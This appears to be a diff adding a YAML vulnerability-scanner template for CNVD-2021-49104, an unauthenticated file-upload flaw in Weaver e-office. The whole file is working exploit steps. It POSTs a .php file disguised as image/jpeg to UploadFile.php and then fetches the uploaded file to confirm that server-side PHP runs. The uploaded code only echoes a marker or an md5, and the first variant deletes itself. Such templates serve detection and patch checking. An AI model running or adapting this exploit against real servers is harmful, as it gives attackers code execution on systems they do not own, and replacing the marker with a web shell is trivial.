@@ -1,0 +1,54 @@
+name: yaml-poc-weaver-weaver_e_office-file_upload-CNVD-2021-49104
+binding: 86860c48-146e-45d0-90d5-b15a8ae33cc9
+detail:
+    author: jiahao.sun
+    links:
+        - https://chowdera.com/2021/12/202112190747169542.html
+    vulnerability:
+        id: b5092b3a-1dab-45bc-9dd3-4608cfecd21a
+        level: critical
+    warning: File Upload
+transport: http
+set:
+    randomBoundary: randomLowercase(20)
+    r1: md5(randomLowercase(8))
+    r2: randomInt(100000000, 200000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+            headers:
+                Content-Type: multipart/form-data; boundary={{randomBoundary}}
+            body: "--{{randomBoundary}}\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{r1}}.php\"\r\nContent-Type: image/jpeg\r\n\n<?php echo \"{{r1}}\"; unlink(__FILE__); ?>\r\n--{{randomBoundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("logo-eoffice.php")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /images/logo/logo-eoffice.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(r1)
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /general/index/UploadFile.php?m=uploadPicture&uploadType=theme&userId=
+            headers:
+                Content-Type: multipart/form-data; boundary={{randomBoundary}}
+            body: "--{{randomBoundary}}\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\necho md5({{r2}});\r\n?>\r\n --{{randomBoundary}}--"
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"name")
+        output:
+            search: '"name\"\\s*:\\s*\"(?P<filename>.+?).php".bsubmatch(response.body)'
+            filename: search["filename"]
+    r3:
+        request:
+            cache: true
+            method: GET
+            path: /images/themes/{{filename}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r2))))
+expression: r0() && r1() || r2() && r3()
